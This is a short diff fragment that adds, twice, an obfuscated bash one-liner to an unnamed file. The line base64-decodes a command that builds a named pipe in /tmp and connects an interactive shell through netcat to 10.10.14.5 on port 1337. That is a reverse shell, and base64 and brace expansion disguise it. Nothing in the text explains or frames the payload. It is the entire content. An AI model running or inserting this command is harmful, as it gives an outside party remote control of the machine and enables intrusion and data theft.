@@ -1,0 +1,2 @@
+bash -c {echo,cm0gL3RtcC9rdW47bWtmaWZvIC90bXAva3VuO2NhdCAvdG1wL2t1bnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC41IDEzMzcgPi90bXAva3Vu}|{base64,-d}|{bash,-i}
+bash -c {echo,cm0gL3RtcC9rdW47bWtmaWZvIC90bXAva3VuO2NhdCAvdG1wL2t1bnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC41IDEzMzcgPi90bXAva3Vu}|{base64,-d}|{bash,-i}
